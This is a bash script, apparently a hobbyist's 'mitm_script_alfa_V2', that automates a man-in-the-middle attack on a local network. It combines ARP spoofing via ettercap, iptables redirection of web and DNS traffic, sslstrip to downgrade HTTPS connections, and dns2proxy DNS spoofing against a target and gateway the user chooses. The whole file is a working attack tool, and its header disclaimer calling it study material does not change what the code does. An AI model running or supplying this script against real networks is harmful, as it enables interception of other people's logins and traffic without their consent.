#!/usr/bin/env bash 
set -x 
#created by br0k3ngl@55

########################################################################################################
#purpose:
#	create one script to automate new way of sslstrip created by Leonardo Nve with dns2Proxy script
#License: automate
#notice: by this, i would like to notify that any use of this script not for studying purposes
# is a violation of law. Please validate your local law. By this i'd like take off any responsibly
# of myself.
# please hack responsibly. 
########################################################################################################

###Variables~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#config files:

etterConf='/etc/etter.conf'
etterConf2='/etc/ettercap/etter.conf'

#vars
interFace=''
trgt=''
gateWay=''
exitSts='1'
iNetSts='1'
runSts='1'
###Functions~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


function redirect(){
	echo 1 > /proc/sys/net/ipv4/ip_forward
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j  REDIRECT --to-port 1000
	iptables -t nat -A PREROUTING -p udp --destination-port 53 -j  REDIRECT --to-port 53
}

function getInterFace (){
if [ $iNetSts != "0" ];then

		ifconfig | awk ' {print $1}' RS="\n\n"
		echo "Select interface to use ";read interFace
	#case $file in
	#	wlan0) interFace=wlan0; echo "wlan0";iNetSts=0;;
	#	eth0) eth0; echo "eth0";iNetSts=0;;
	#	3) exit;;
	#	*) echo "wrong choice";iNetSts=1;;
	#esac
		
fi
}
function getClients (){
	arp-scan -l -I $interFace
}


function arpSpoof(){
	
	#arpsspoof -i $interFace -t $trgt $gateWay
if [ $trgt == "0" ] && [ $gateWay=="0" ];then
	ettercap -T -q -M arp:remote // // -P autoadd  -i $interFace &
else
	ettercap -T -q -M arp:remote /$trgt/ /$gateWay/  -i $interFace & 
fi
}

function getTarget (){
echo " enter target "; read trgt
echo " enter gateway"; read gateWay
}

function dns2ProxyConfig(){
if [ $exitSts != "0" ];then
		echo "1) conf by domain"
		echo "2) conf by IP"
		echo "0) exit"
	echo -n "Your Choice  ";read dnsconf
	case $dnsconf in
			1) echo -e "provide domains  if several devide by giving \n "; read conf; echo $conf > /opt/dns2proxy/domains.cfg;;
				
			2) echo -e "provide IP"     ; read conf; echo $conf > /opt/dns2proxy-master/spoof.cfg ;;
				
			0) echo -e "exiting"; exitSts=0;;
				
			*) echo -e "Wrong choise -> choose again";;
		esac
		
fi
}

function sslStrp(){
	redirect
	/usr/local/bin/sslstrip -a  -l 10000 &
}
function dns2ProxyManipulation(){
cd /opt/dns2proxy-master/
dns2proxy.py 127.0.0.1 &
}


function sslStripWithARPSpoof(){
	cmd=`ps aux |grep arpspoof|grep -v grep;echo $?`
	cmd2=`ps aux |grep ettercap|grep -v grep;echo $?`
	cmd3=`ps aux |grep dnsspoof|grep -v grep;echo $?`
if [ $cmd == "1" ] || [$cmd2 == "1" ] || [ $cmd == "1" ];then
	sslStrp
		arpSpoof #dns2ProxyManipulation 
fi
}

function checkUser(){
if [ $EUID != "0" ];then
	echo " Please Run with ROOT!"
		exit;
else
getInterFace; sleep 1
	dns2ProxyConfig
		getClients
			getTarget
				dns2ProxyManipulation
					sslStripWithARPSpoof
fi
}

###Actions~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#firstRun
	echo -e " mitm_script_alfa_V2\n";
		 checkUser
